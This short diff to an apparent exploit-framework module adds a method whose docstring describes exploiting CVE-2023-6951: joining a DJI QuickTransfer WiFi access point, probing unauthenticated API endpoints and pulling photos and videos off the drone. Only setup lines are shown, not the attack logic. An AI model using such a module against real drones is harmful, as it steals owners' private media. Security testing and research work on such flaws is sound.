@@ -115,6 +115,12 @@ class Exploit(Exploit):
         if not self._validate():
             return
 
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E CVE-2023-6951: connect to DJI QuickTransfer WiFi AP,
+        enumerate unauthenticated API endpoints, and exfiltrate media
+        (photos/videos) from the drone storage via HTTP GET requests."""
         simulate = bool(self.simulate)
         target_ip = str(self.target).strip()
         timeout_s = int(self.timeout)
